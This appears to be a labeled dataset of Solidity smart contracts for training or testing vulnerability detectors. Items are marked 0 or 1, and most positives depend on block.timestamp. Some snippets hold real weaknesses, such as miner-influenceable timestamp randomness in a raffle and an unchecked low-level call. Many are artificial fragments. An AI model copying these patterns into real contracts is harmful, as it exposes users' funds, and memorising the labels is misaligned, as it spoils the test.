0<CODESPLIT>contract ERC721Token is ERC721, ERC721BasicToken {         string internal name_;         string internal symbol_;         mapping(address => uint256[]) internal ownedTokens;         mapping(uint256 => uint256) internal ownedTokensIndex;         uint256[] internal allTokens;         mapping(uint256 => uint256) internal allTokensIndex;         constructor(string _name, string _symbol) public {        name_ = _name;        symbol_ = _symbol;    }         function name() public view returns (string) {        return name_;    }         function symbol() public view returns (string) {        return symbol_;    }         function tokenOfOwnerByIndex(address _owner, uint256 _index) public view returns (uint256) {        require(_index < balanceOf(_owner));        return ownedTokens[_owner][_index];    }         function totalSupply() public view returns (uint256) {        return allTokens.length;    }         function tokenByIndex(uint256 _index) public view returns (uint256) {        require(_index < totalSupply());        return allTokens[_index];    }         function addTokenTo(address _to, uint256 _tokenId) internal {        super.addTokenTo(_to, _tokenId);        uint256 length = ownedTokens[_to].length;        ownedTokens[_to].push(_tokenId);        ownedTokensIndex[_tokenId] = length;    }         function removeTokenFrom(address _from, uint256 _tokenId) internal {        super.removeTokenFrom(_from, _tokenId);        uint256 tokenIndex = ownedTokensIndex[_tokenId];        uint256 lastTokenIndex = ownedTokens[_from].length.sub(1);        uint256 lastToken = ownedTokens[_from][lastTokenIndex];        ownedTokens[_from][tokenIndex] = lastToken;        ownedTokens[_from][lastTokenIndex] = 0;                                   ownedTokens[_from].length--;        ownedTokensIndex[_tokenId] = 0;        ownedTokensIndex[lastToken] = tokenIndex;    }         function _mint(address _to, uint256 _tokenId) internal {        super._mint(_to, _tokenId);        allTokensIndex[_tokenId] = allTokens.length;        allTokens.push(_tokenId);    }} 
0<CODESPLIT>contract BaseGame is ERC721Token {              event NewAccount(address owner, uint tokenId, uint parentTokenId, uint blockNumber);         event NewForecast(address owner, uint tokenId, uint forecastId, uint _gameId,        uint _forecastData);              struct Token {                 uint createBlockNumber;                 uint parentId;    }    enum Teams { DEF,        RUS, SAU, EGY, URY,              PRT, ESP, MAR, IRN,              FRA, AUS, PER, DNK,              ARG, ISL, HRV, NGA,              BRA, CHE, CRI, SRB,              DEU, MEX, SWE, KOR,              BEL, PAN, TUN, GBR,              POL, SEN, COL, JPN           }         event GameChanged(uint _gameId, uint64 gameDate, Teams teamA, Teams teamB,        uint goalA, uint goalB, bool odds, uint shotA, uint shotB);         struct Game {                 uint64 gameDate;                 Teams teamA;        Teams teamB;                 uint goalA;        uint goalB;                 bool odds;                 uint shotA;        uint shotB;                 uint[] forecasts;    }         struct Forecast {                 uint gameId;        uint forecastBlockNumber;        uint forecastData;    }              Token[] tokens;                   mapping (uint => Game) games;         Forecast[] forecasts;         mapping (uint => uint) internal forecastToToken;         mapping (uint => uint[]) internal tokenForecasts;         constructor(string _name, string _symbol) ERC721Token(_name, _symbol) public {}              function _createToken(uint _parentId, address _owner) internal whenNotPaused    returns (uint) {        Token memory _token = Token({            createBlockNumber: block.number,            parentId: _parentId            });        uint newTokenId = tokens.push(_token) - 1;        emit NewAccount(_owner, newTokenId, uint(_token.parentId), uint(_token.createBlockNumber));        _mint(_owner, newTokenId);        return newTokenId;    }         function _createForecast(uint _tokenId, uint _gameId, uint _forecastData) internal whenNotPaused returns (uint) {        require(_tokenId < tokens.length);        Forecast memory newForecast = Forecast({            gameId: _gameId,            forecastBlockNumber: block.number,            forecastData: _forecastData            });        uint newForecastId = forecasts.push(newForecast) - 1;        forecastToToken[newForecastId] = _tokenId;        tokenForecasts[_tokenId].push(newForecastId);        games[_gameId].forecasts.push(newForecastId);                 emit NewForecast(tokenOwner[_tokenId], _tokenId, newForecastId, _gameId, _forecastData);        return newForecastId;    }    }
1<CODESPLIT>contract BaseGameLogic is BaseGame {         uint public prizeFund = 0;         uint public basePrice = 21 finney;              uint public gameCloneFee = 7000;              uint public priceFactor = 10000;              uint public prizeFundFactor = 5000;                constructor(string _name, string _symbol) BaseGame(_name, _symbol) public {}         function _addToFund(uint _val, bool isAll) internal whenNotPaused {        if(isAll) {            prizeFund = prizeFund.add(_val);        } else {            prizeFund = prizeFund.add(_val.mul(prizeFundFactor).div(10000));        }    }         function createAccount() external payable whenNotPaused returns (uint) {        require(msg.value >= basePrice);                 _addToFund(msg.value, false);        return _createToken(0, msg.sender);    }         function cloneAccount(uint _tokenId) external payable whenNotPaused returns (uint) {        require(exists(_tokenId));        uint tokenPrice = calculateTokenPrice(_tokenId);        require(msg.value >= tokenPrice);                 uint newToken = _createToken( _tokenId, msg.sender);                          uint gameFee = tokenPrice.mul(gameCloneFee).div(10000);                 _addToFund(gameFee, false);                 uint ownerProceed = tokenPrice.sub(gameFee);        address tokenOwnerAddress = tokenOwner[_tokenId];        tokenOwnerAddress.transfer(ownerProceed);        return newToken;    }         function createForecast(uint _tokenId, uint _gameId,        uint8 _goalA, uint8 _goalB, bool _odds, uint8 _shotA, uint8 _shotB)    external whenNotPaused onlyOwnerOf(_tokenId) returns (uint){        require(exists(_tokenId));        require(block.timestamp < games[_gameId].gameDate);        uint _forecastData = toForecastData(_goalA, _goalB, _odds, _shotA, _shotB);        return _createForecast(_tokenId, _gameId, _forecastData);                      }         function tokensOfOwner(address _owner) public view returns(uint[] ownerTokens) {        uint tokenCount = balanceOf(_owner);        if (tokenCount == 0) {                         return new uint[](0);        } else {            uint[] memory result = new uint[](tokenCount);            uint totalToken = totalSupply();            uint resultIndex = 0;            uint _tokenId;            for (_tokenId = 1; _tokenId <= totalToken; _tokenId++) {                if (tokenOwner[_tokenId] == _owner) {                    result[resultIndex] = _tokenId;                    resultIndex++;                }            }            return result;        }    }         function forecastOfToken(uint _tokenId) public view returns(uint[]) {        uint forecastCount = tokenForecasts[_tokenId].length;        if (forecastCount == 0) {                         return new uint[](0);        } else {            uint[] memory result = new uint[](forecastCount);            uint resultIndex;            for (resultIndex = 0; resultIndex < forecastCount; resultIndex++) {                result[resultIndex] = tokenForecasts[_tokenId][resultIndex];            }            return result;        }    }         function gameInfo(uint _gameId) external view returns(        uint64 gameDate, Teams teamA, Teams teamB, uint goalA, uint gaolB,        bool odds, uint shotA, uint shotB, uint forecastCount    ){        gameDate = games[_gameId].gameDate;        teamA = games[_gameId].teamA;        teamB = games[_gameId].teamB;        goalA = games[_gameId].goalA;        gaolB = games[_gameId].goalB;        odds = games[_gameId].odds;        shotA = games[_gameId].shotA;        shotB = games[_gameId].shotB;        forecastCount = games[_gameId].forecasts.length;    }         function forecastInfo(uint _fId) external view        returns(uint gameId, uint f) {        gameId = forecasts[_fId].gameId;        f = forecasts[_fId].forecastData;    }    function tokenInfo(uint _tokenId) external view        returns(uint createBlockNumber, uint parentId, uint forecast, uint score, uint price) {        createBlockNumber = tokens[_tokenId].createBlockNumber;        parentId = tokens[_tokenId].parentId;        price = calculateTokenPrice(_tokenId);        forecast = getForecastCount(_tokenId, block.number, false);        score = getScore(_tokenId);    }         function calculateTokenPrice(uint _tokenId) public view returns(uint) {        require(exists(_tokenId));                 uint forecastCount = getForecastCount(_tokenId, block.number, true);        return (forecastCount.add(1)).mul(basePrice).mul(priceFactor).div(10000);    }         function getForecastCount(uint _tokenId, uint _blockNumber, bool isReleased) public view returns(uint) {        require(exists(_tokenId));        uint forecastCount = 0 ;        uint index = 0;        uint count = tokenForecasts[_tokenId].length;        for (index = 0; index < count; index++) {                         if(forecasts[tokenForecasts[_tokenId][index]].forecastBlockNumber < _blockNumber){                if(isReleased) {                    if (games[forecasts[tokenForecasts[_tokenId][index]].gameId].gameDate < block.timestamp) {                        forecastCount = forecastCount + 1;                    }                } else {                    forecastCount = forecastCount + 1;                }            }        }                 if(tokens[_tokenId].parentId != 0){            forecastCount = forecastCount.add(getForecastCount(tokens[_tokenId].parentId,                tokens[_tokenId].createBlockNumber, isReleased));        }        return forecastCount;    }         function getScore(uint _tokenId) public view returns (uint){        uint[] memory _gameForecast = new uint[](65);        return getScore(_tokenId, block.number, _gameForecast);    }         function getScore(uint _tokenId, uint _blockNumber, uint[] _gameForecast) public view returns (uint){        uint score = 0;                 uint[] memory _forecasts = forecastOfToken(_tokenId);        if (_forecasts.length > 0){            uint256 _index;            for(_index = _forecasts.length - 1; _index >= 0 && _index < _forecasts.length ; _index--){                                                                   if(forecasts[_forecasts[_index]].forecastBlockNumber < _blockNumber &&                    _gameForecast[forecasts[_forecasts[_index]].gameId] == 0 &&                    block.timestamp > games[forecasts[_forecasts[_index]].gameId].gameDate                ){                    score = score.add(calculateScore(                            forecasts[_forecasts[_index]].gameId,                            forecasts[_forecasts[_index]].forecastData                        ));                    _gameForecast[forecasts[_forecasts[_index]].gameId] = forecasts[_forecasts[_index]].forecastBlockNumber;                }            }        }                 if(tokens[_tokenId].parentId != 0){            score = score.add(getScore(tokens[_tokenId].parentId, tokens[_tokenId].createBlockNumber, _gameForecast));        }        return score;    }         function getForecastScore(uint256 _forecastId) external view returns (uint256) {        require(_forecastId < forecasts.length);        return calculateScore(            forecasts[_forecastId].gameId,            forecasts[_forecastId].forecastData        );    }         function calculateScore(uint256 _gameId, uint d)    public view returns (uint256){        require(block.timestamp > games[_gameId].gameDate);        uint256 _shotB = (d & 0xff);        d = d >> 8;        uint256 _shotA = (d & 0xff);        d = d >> 8;        uint odds8 = (d & 0xff);        bool _odds = odds8 == 1 ? true: false;        d = d >> 8;        uint256 _goalB = (d & 0xff);        d = d >> 8;        uint256 _goalA = (d & 0xff);        d = d >> 8;        Game memory cGame = games[_gameId];        uint256 _score = 0;        bool isDoubleScore = true;        if(cGame.shotA == _shotA) {            _score = _score.add(1);        } else {            isDoubleScore = false;        }        if(cGame.shotB == _shotB) {            _score = _score.add(1);        } else {            isDoubleScore = false;        }        if(cGame.odds == _odds) {            _score = _score.add(1);        } else {            isDoubleScore = false;        }                 if((cGame.goalA + cGame.goalB) == (_goalA + _goalB)) {            _score = _score.add(2);        } else {            isDoubleScore = false;        }                 if(cGame.goalA == _goalA && cGame.goalB == _goalB) {            _score = _score.add(3);        } else {            isDoubleScore = false;        }        if( ((cGame.goalA > cGame.goalB) && (_goalA > _goalB)) ||            ((cGame.goalA < cGame.goalB) && (_goalA < _goalB)) ||            ((cGame.goalA == cGame.goalB) && (_goalA == _goalB))) {            _score = _score.add(1);        } else {            isDoubleScore = false;        }                 if(isDoubleScore) {            _score = _score.mul(2);        }        return _score;    }              function setBasePrice(uint256 _val) external onlyAdmin {        require(_val > 0);        basePrice = _val;    }         function setGameCloneFee(uint256 _val) external onlyAdmin {        require(_val <= 10000);        gameCloneFee = _val;    }         function setPrizeFundFactor(uint256 _val) external onlyAdmin {        require(_val <= 10000);        prizeFundFactor = _val;    }         function setPriceFactor(uint256 _val) external onlyAdmin {        priceFactor = _val;    }         function gameEdit(uint256 _gameId, uint64 gameDate,        Teams teamA, Teams teamB)    external onlyAdmin {        games[_gameId].gameDate = gameDate;        games[_gameId].teamA = teamA;        games[_gameId].teamB = teamB;        emit GameChanged(_gameId, games[_gameId].gameDate, games[_gameId].teamA, games[_gameId].teamB,            0, 0, true, 0, 0);    }    function gameResult(uint256 _gameId, uint256 goalA, uint256 goalB, bool odds, uint256 shotA, uint256 shotB)    external onlyAdmin {        games[_gameId].goalA = goalA;        games[_gameId].goalB = goalB;        games[_gameId].odds = odds;        games[_gameId].shotA = shotA;        games[_gameId].shotB = shotB;        emit GameChanged(_gameId, games[_gameId].gameDate, games[_gameId].teamA, games[_gameId].teamB,            goalA, goalB, odds, shotA, shotB);    }    function toForecastData(uint8 _goalA, uint8 _goalB, bool _odds, uint8 _shotA, uint8 _shotB)    pure internal returns (uint) {        uint forecastData;        forecastData = forecastData << 8 | _goalA;        forecastData = forecastData << 8 | _goalB;        uint8 odds8 = _odds ? 1 : 0;        forecastData = forecastData << 8 | odds8;        forecastData = forecastData << 8 | _shotA;        forecastData = forecastData << 8 | _shotB;        return forecastData;    }}
0<CODESPLIT>contract HWCIntegration is BaseGameLogic {    event NewHWCRegister(address owner, string aD, string aW);    constructor(string _name, string _symbol) BaseGameLogic(_name, _symbol) public {}    struct HWCInfo {        string aDeposit;        string aWithdraw;        uint deposit;        uint index1;             }    uint public cHWCtoEth = 0;    uint256 public prizeFundHWC = 0;         mapping (address => HWCInfo) hwcAddress;    address[] hwcAddressList;    function _addToFundHWC(uint256 _val) internal whenNotPaused {        prizeFundHWC = prizeFundHWC.add(_val.mul(prizeFundFactor).div(10000));    }    function registerHWCDep(string _a) public {        require(bytes(_a).length == 34);        hwcAddress[msg.sender].aDeposit = _a;        if(hwcAddress[msg.sender].index1 == 0){            hwcAddress[msg.sender].index1 = hwcAddressList.push(msg.sender);        }        emit NewHWCRegister(msg.sender, _a, '');    }    function registerHWCWit(string _a) public {        require(bytes(_a).length == 34);        hwcAddress[msg.sender].aWithdraw = _a;        if(hwcAddress[msg.sender].index1 == 0){            hwcAddress[msg.sender].index1 = hwcAddressList.push(msg.sender);        }        emit NewHWCRegister(msg.sender, '', _a);    }    function getHWCAddressCount() public view returns (uint){        return hwcAddressList.length;    }    function getHWCAddressByIndex(uint _index) public view returns (string aDeposit, string aWithdraw, uint d) {        require(_index < hwcAddressList.length);        return getHWCAddress(hwcAddressList[_index]);    }    function getHWCAddress(address _val) public view returns (string aDeposit, string aWithdraw, uint d) {        aDeposit = hwcAddress[_val].aDeposit;        aWithdraw = hwcAddress[_val].aWithdraw;        d = hwcAddress[_val].deposit;    }    function setHWCDeposit(address _user, uint _val) external onlyAdmin {        hwcAddress[_user].deposit = _val;    }    function createTokenByHWC(address _userTo, uint256 _parentId) external onlyAdmin whenNotPaused returns (uint) {                 uint256 tokenPrice = basePrice.div(1e10).mul(cHWCtoEth);        if(_parentId > 0) {            tokenPrice = calculateTokenPrice(_parentId);            tokenPrice = tokenPrice.div(1e10).mul(cHWCtoEth);                         uint gameFee = tokenPrice.mul(gameCloneFee).div(10000);            _addToFundHWC(gameFee);            uint256 ownerProceed = tokenPrice.sub(gameFee);            address tokenOwnerAddress = tokenOwner[_parentId];            hwcAddress[tokenOwnerAddress].deposit = hwcAddress[tokenOwnerAddress].deposit + ownerProceed;        } else {            _addToFundHWC(tokenPrice);        }        return _createToken(_parentId, _userTo);    }    function setCourse(uint _val) external onlyAdmin {        cHWCtoEth = _val;    }}
0<CODESPLIT>contract SolutionGame is HWCIntegration {         uint256 countWinnerPlace;         mapping (uint256 => uint256) internal prizeDistribution;         mapping (uint256 => uint256) internal prizesByPlace;    mapping (uint256 => uint256) internal scoreByPlace;         mapping (uint => uint) winnerMap;    uint[] winnerList;    mapping (uint256 => uint256) internal prizesByPlaceHWC;    bool isWinnerTime = false;    modifier whenWinnerTime() {        require(isWinnerTime);        _;    }    constructor(string _name, string _symbol) HWCIntegration(_name, _symbol) public {        countWinnerPlace = 0;           }                   function() external payable {        _addToFund(msg.value, true);    }    function setWinnerTimeStatus(bool _status) external onlyOwner {        isWinnerTime = _status;    }         function withdrawBalance() external onlyOwner {        owner.transfer(address(this).balance.sub(prizeFund));    }         function setCountWinnerPlace(uint256 _val) external onlyOwner {        countWinnerPlace = _val;    }         function setWinnerPlaceDistribution(uint256 place, uint256 _val) external onlyOwner {        require(place <= countWinnerPlace);        require(_val <= 10000);        uint256 testVal = 0;        uint256 index;        for (index = 1; index <= countWinnerPlace; index ++) {            if(index != place) {                testVal = testVal + prizeDistribution[index];            }        }        testVal = testVal + _val;        require(testVal <= 10000);        prizeDistribution[place] = _val;    }              function setCountWinnerByPlace(uint256 place, uint256 _winnerCount, uint256 _winnerScore) public onlyOwner whenPaused {        require(_winnerCount > 0);        require(place <= countWinnerPlace);        prizesByPlace[place] = prizeFund.mul(prizeDistribution[place]).div(10000).div(_winnerCount);        prizesByPlaceHWC[place] = prizeFundHWC.mul(prizeDistribution[place]).div(10000).div(_winnerCount);        scoreByPlace[place] = _winnerScore;    }    function checkIsWinner(uint _tokenId) public view whenPaused onlyOwnerOf(_tokenId)    returns (uint place) {        place = 0;        uint score = getScore(_tokenId);        for(uint index = 1; index <= countWinnerPlace; index ++) {            if (score == scoreByPlace[index]) {                                 place = index;                break;            }        }    }    function getMyPrize() external whenWinnerTime {        uint[] memory tokenList = tokensOfOwner(msg.sender);        for(uint index = 0; index < tokenList.length; index ++) {            getPrizeByToken(tokenList[index]);        }    }    function getPrizeByToken(uint _tokenId) public whenWinnerTime onlyOwnerOf(_tokenId) {        uint place = checkIsWinner(_tokenId);        require (place > 0);        uint prize = prizesByPlace[place];        if(prize > 0) {            if(winnerMap[_tokenId] == 0) {                winnerMap[_tokenId] = prize;                winnerList.push(_tokenId);                address _owner = tokenOwner[_tokenId];                if(_owner != address(0)){                                         uint hwcPrize = prizesByPlaceHWC[place];                    hwcAddress[_owner].deposit = hwcAddress[_owner].deposit + hwcPrize;                    _owner.transfer(prize);                }            }        }    }    function getWinnerList() external view onlyAdmin returns (uint[]) {        return winnerList;    }    function getWinnerInfo(uint _tokenId) external view onlyAdmin returns (uint){        return winnerMap[_tokenId];    }    function getResultTable(uint _start, uint _count) external view returns (uint[]) {        uint[] memory results = new uint[](_count);        for(uint index = _start; index < tokens.length && index < (_start + _count); index++) {            results[(index - _start)] = getScore(index);        }        return results;    }}
1<CODESPLIT>contract ESS {    address public token;    mapping (address => uint256) public sold;    uint256 public pubEnd = 0;    function withdrawPUB() public returns(bool){        require(block.timestamp > pubEnd);        bool result = token.call(bytes4(keccak256("transfer(address,uint256)")), msg.sender, sold[msg.sender]);        return result;    }}
1<CODESPLIT>contract Bittwatt {    function createDate(uint _minutes, uint _seconds) public view returns (uint) {        uint currentTimestamp = block.timestamp;        currentTimestamp += _seconds;        currentTimestamp += 60 * _minutes;        return currentTimestamp;    }}
1<CODESPLIT>contract CoinLock {    uint public expiration;    function lock(uint _expiration) returns (bool) {        if (_expiration > block.timestamp && expiration == 0) {            expiration = _expiration;            return true;        }        return false;    }}
1<CODESPLIT>contract UselessEthereumToken {    function() payable {        if (msg.value >= 10 finney) {            bytes20 bonusHash = ripemd160(block.coinbase, block.number, block.timestamp);            if (bonusHash[0] == 0) {                uint8 bonusMultiplier = ((bonusHash[1] & 0x01 != 0) ? 1 : 0);                uint256 bonusTokensIssued = (msg.value * 100) * bonusMultiplier;            }        }    }}
1<CODESPLIT>contract BaseDebtCache  {    function _cacheStale(uint timestamp) internal view returns (bool) {        return 5 < block.timestamp - timestamp || timestamp == 0;    }}
1<CODESPLIT>contract BaseModule  {    function _isLocked(address _wallet) internal view returns (bool) {        return uint64(block.timestamp) > 10;    }}
1<CODESPLIT>contract BaseRewardEscrowV2 {    function _claimableAmount() internal view returns (bool) {        bool quantity = block.timestamp >= 10 ? true : false;        return quantity;    }}
1<CODESPLIT>contract BZRXv1Converter{    function _getTimestamp() internal view returns (uint256){        return block.timestamp;    }}
1<CODESPLIT>contract BZRXv1ConverterMock {    uint256 public currentTime;    function _getTimestamp() internal view returns (uint256){        if (currentTime != 0) {            return currentTime;        } else {            return block.timestamp;        }    }}
1<CODESPLIT>contract Collateral{    function _checkLoanAvailable() internal view {        require(10 <= block.timestamp, "Loan recently interacted with");    }}
1<CODESPLIT>contract CollateralManagerState {    uint[] public borrowRates;    uint public borrowRatesLastUpdated;    function updateBorrowRates(uint rate) external {        borrowRates.push(rate);        borrowRatesLastUpdated = block.timestamp;        return;    }}
1<CODESPLIT>contract DappRegistry {    mapping (address => bytes32) public enabledRegistryIds;    mapping (uint8 => mapping (address => bytes32)) public authorisations;    function isAuthorised(address _wallet, address _spender, address _to) external view returns (bool) {        uint registries = uint(enabledRegistryIds[_wallet]);        for(uint registryId = 0; registryId == 0 || (registries >> registryId) > 0; registryId++) {            bool isEnabled = (((registries >> registryId) & 1) > 0) ;            if(isEnabled) {                uint auth = uint(authorisations[uint8(registryId)][_spender]);                uint validAfter = auth & 0xffffffffffffffff;                if (0 < validAfter && validAfter <= block.timestamp) {                    address filter = address(uint160(auth >> 64));                    return true;                }            }        }        return false;    }}
1<CODESPLIT>contract DebtCache{    function takeDebtSnapshot() external returns(bool){        uint _cacheTimestamp = block.timestamp;        if(_cacheTimestamp >= 10)            return true;        return false;    }}
1<CODESPLIT>contract DeflatingERC20 {    address recoveredAddress;    function permit(address owner, uint deadline) external {        require(deadline >= block.timestamp, 'EXPIRED');        require(recoveredAddress != address(0) && recoveredAddress == owner);    }}
1<CODESPLIT>contract UserAuth {    address public owner;    address public pendingOwner;    uint public claimOnwershipTime = 5;    function setOwner() public {        require(pendingOwner != address(0));        require(block.timestamp > claimOnwershipTime);        owner = pendingOwner;        pendingOwner = address(0);    }}
1<CODESPLIT>contract KingOfTheEtherThrone {    struct Monarch {        address etherAddress;        string name;        uint claimPrice;        uint coronationTimestamp;    }    address wizardAddress;    uint constant startingClaimPrice = 100 finney;    uint public currentClaimPrice;    Monarch public currentMonarch;    function KingOfTheEtherThrone() {        wizardAddress = msg.sender;        currentClaimPrice = startingClaimPrice;        currentMonarch = Monarch(wizardAddress, "[Vacant]", 0, block.timestamp);    }}
1<CODESPLIT>contract Kleros{    uint[5] public timePerPeriod;    uint public lastPeriodChange = 2;    uint public period = 1;    function passPeriod() public {        require(block.timestamp - lastPeriodChange >= timePerPeriod[uint8(period)]);    }}
1<CODESPLIT>contract LoanTokenLogicStandard{    function tokenPrice()public view returns (uint256)  {        uint256 lastSettleTime_;        if (lastSettleTime_ != uint88(block.timestamp)) {            return lastSettleTime_;        }        return 0;    }}
1<CODESPLIT>contract LockedTokenVault{    uint256 public _START_RELEASE_TIME_;    function isReleaseStart() external view returns (bool) {        return block.timestamp >= _START_RELEASE_TIME_;    }}
1<CODESPLIT>contract FreyrTokenLocker {    uint256 public releaseTime;    function secondsRemaining() public constant returns (uint timestamp) {        if (block.timestamp < releaseTime)            return releaseTime;        else            return 0;    }}
1<CODESPLIT>contract mockOVM_CrossDomainMessenger{    struct ReceivedMessage {        uint256 timestamp;        address sender;    }    ReceivedMessage[] internal fullReceivedMessages;    uint256 internal lastRelayedMessage;    uint256 internal delay;    address  public xDomainMessageSender;    function relayNextMessage() public {        ReceivedMessage memory nextMessage = fullReceivedMessages[lastRelayedMessage];        require(nextMessage.timestamp + delay < block.timestamp);        xDomainMessageSender = nextMessage.sender;        lastRelayedMessage += 1;    }}
1<CODESPLIT> contract NBUNIERC20 {    uint256 public contractStartTimestamp = now;    function getSecondsLeftInLiquidityGenerationEvent() public view returns (uint256) {         return contractStartTimestamp + (7 days) - (block.timestamp);    }}
1<CODESPLIT>contract OVM_CanonicalTransactionChain {    function _validateFirstBatchContext() internal view {        uint256 forceInclusionPeriodSeconds = 10;        uint256  _firstContext = 20;        require(_firstContext + forceInclusionPeriodSeconds >= block.timestamp);    }}
1<CODESPLIT>contract SaiVox {    function era() public view returns (uint) {        return block.timestamp;    }}
1<CODESPLIT>contract SplitResolver{    uint src = 10;    uint ethAddr = 10;    uint destAmt;    uint dest = 5;    function swapUniswap() internal returns (uint) {        if (src == ethAddr) {            destAmt = block.timestamp;        } else if (dest == ethAddr) {            destAmt = 1;        }        return destAmt;    }}
1<CODESPLIT>contract StakingV1 {    function vestedBalanceForAmount(uint256 vestingEndTime) public view returns (uint256 vested){        vestingEndTime = vestingEndTime - block.timestamp;        vested = vestingEndTime * 20;        return vested;    }}
1<CODESPLIT>contract TimeLockedToken {    uint256 constant LOCK_START = 1595609911;    uint256 constant FIRST_EPOCH_DELAY = 30 days;    uint256 constant EPOCH_DURATION = 90 days;    uint256 constant TOTAL_EPOCHS = 8;    function epochsPassed() public view returns (uint256) {        uint256 timePassed = block.timestamp - LOCK_START;        if (timePassed < FIRST_EPOCH_DELAY) {            return 0;        }        uint256 totalEpochsPassed =(timePassed-FIRST_EPOCH_DELAY)/(EPOCH_DURATION);        if (totalEpochsPassed > TOTAL_EPOCHS) {            return TOTAL_EPOCHS;        }        return totalEpochsPassed;    }}
1<CODESPLIT>contract TmpAdminInterestSettlemen {    uint256 endTimestamp =10;    uint256 itemCount = 4;    function tmpSettleFeeRewards () returns (bool){        uint256 interestTime = block.timestamp;        if (interestTime > endTimestamp) {            interestTime = endTimestamp;            itemCount++;        }        if (itemCount > 0) {            return true;        }    }}
1<CODESPLIT>contract TokenPriceRegistry{    uint256 public minPriceUpdatePeriod = 10;    function setPriceForTokenList() {        uint64 updatedAt = 10;        require(updatedAt == 0 || block.timestamp >= updatedAt + minPriceUpdatePeriod);    }}
1<CODESPLIT>contract TransactionManager{    function addToWhitelist(address _wallet, address _target) returns (uint256){        uint256 whitelistPeriod = 10;        uint256 whitelistAfter = block.timestamp + whitelistPeriod;        return whitelistAfter;    }}
1<CODESPLIT>contract JesusCrowdsale {  uint256 constant public START = 1507755600;  function getRate() constant returns (uint8) {    if (block.timestamp < START)        return 166;    return 120;  }}
1<CODESPLIT>contract CardboardUnicornAssembler {  address public owner = msg.sender;  uint public pricePerUnicorn = 1 finney;  uint public lastPriceSetDate = 0;  modifier onlyOwner {    require(msg.sender == owner);    _;  }  function setPrice(uint _newPrice) onlyOwner {    pricePerUnicorn = _newPrice;    lastPriceSetDate = block.timestamp;    return;  }}
1<CODESPLIT>contract LocalEthereumEscrows {    function createEscrow(uint32 _expiry) payable external {        require(block.timestamp < _expiry, "Signature has expired");        return;    }}
1<CODESPLIT>contract ProVisionRaffle {    address[] public Raffle_Entries;    function random() private view returns (uint8) {        return uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % Raffle_Entries.length);    }}
1<CODESPLIT>contract KYCPresale is CrowdsaleBase, KYCPayloadDeserializer {     uint256 public saleWeiCap;     address public signerAddress;     event SignerChanged(address signer);     event Prepurchased(address investor, uint weiAmount, uint tokenAmount, uint128 customerId, uint256 pricingInfo);     event CapUpdated(uint256 newCap);     function KYCPresale(address _multisigWallet, uint _start, uint _end, uint _saleWeiCap) CrowdsaleBase(FractionalERC20(address(1)), PricingStrategy(address(0)), _multisigWallet, _start, _end, 0) {    saleWeiCap = _saleWeiCap;  }     function buyWithKYCData(bytes dataframe, uint8 v, bytes32 r, bytes32 s) public payable returns(uint tokenAmount) {         require(!halted);    bytes32 hash = sha256(dataframe);    var (whitelistedAddress, customerId, minETH, maxETH, pricingInfo) = getKYCPayload(dataframe);    uint multiplier = 10 ** 18;    address receiver = msg.sender;    uint weiAmount = msg.value;         require(ecrecover(hash, v, r, s) == signerAddress);         if(getState() == State.PreFunding) {             require(earlyParticipantWhitelist[receiver]);    } else if(getState() == State.Funding) {                  } else {             revert();    }    if(investedAmountOf[receiver] == 0) {               investorCount++;    }         investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);         weiRaised = weiRaised.plus(weiAmount);         require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));    require(investedAmountOf[msg.sender] >= minETH * multiplier / 10000);    require(investedAmountOf[msg.sender] <= maxETH * multiplier / 10000);         require(multisigWallet.send(weiAmount));         Prepurchased(receiver, weiAmount, tokenAmount, customerId, pricingInfo);    return 0;    }        function setSignerAddress(address _signerAddress) onlyOwner {    signerAddress = _signerAddress;    SignerChanged(signerAddress);  }     function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {    if(weiRaisedTotal > saleWeiCap) {      return true;    } else {      return false;    }  }     function isCrowdsaleFull() public constant returns (bool) {    return weiRaised >= saleWeiCap;  }     function setWeiCap(uint newCap) public onlyOwner {    saleWeiCap = newCap;    CapUpdated(newCap);  }     function assignTokens(address receiver, uint tokenAmount) internal {    revert();  }     function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {  }     function getState() public constant returns (State) {    if (block.timestamp < startsAt) {      return State.PreFunding;    } else {      return State.Funding;    }  }}
1<CODESPLIT>contract Claes{    uint256 public genesisTimestamp;    uint256 public currentRoundCount;    function Claes() public {        genesisTimestamp = block.timestamp;        currentRoundCount = 1;        return;    }}
0<CODESPLIT>contract ComplianceService {	function validate(address _from, address _to, uint256 _amount) public returns (bool allowed) {		return true;	}}
0<CODESPLIT>contract HardcodedWallets {	 	address public walletFounder1;  	address public walletFounder2;  	address public walletFounder3;  	address public walletCommunityReserve;	 	address public walletCompanyReserve;	 	address public walletTeamAdvisors;		 	address public walletBountyProgram;		 	 	 	constructor() public {		 		walletFounder1             = 0x5E69332F57Ac45F5fCA43B6b007E8A7b138c2938;  		walletFounder2             = 0x852f9a94a29d68CB95Bf39065BED6121ABf87607;  		walletFounder3             = 0x0a339965e52dF2c6253989F5E9173f1F11842D83;  		 		walletCommunityReserve = 0xB79116a062939534042d932fe5DF035E68576547;		walletCompanyReserve = 0xA6845689FE819f2f73a6b9C6B0D30aD6b4a006d8;		walletTeamAdvisors = 0x0227038b2560dF1abf3F8C906016Af0040bc894a;		walletBountyProgram = 0xdd401Df9a049F6788cA78b944c64D21760757D73;	}}library SafeMath {	 	function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {		if (a == 0) {			return 0;		}		c = a * b;		assert(c / a == b);		return c;	}	 	function div(uint256 a, uint256 b) internal pure returns (uint256) {		 		 		 		return a / b;	}	 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {		assert(b <= a);		return a - b;	}	 	function add(uint256 a, uint256 b) internal pure returns (uint256 c) {		c = a + b;		assert(c >= a);		return c;	}}
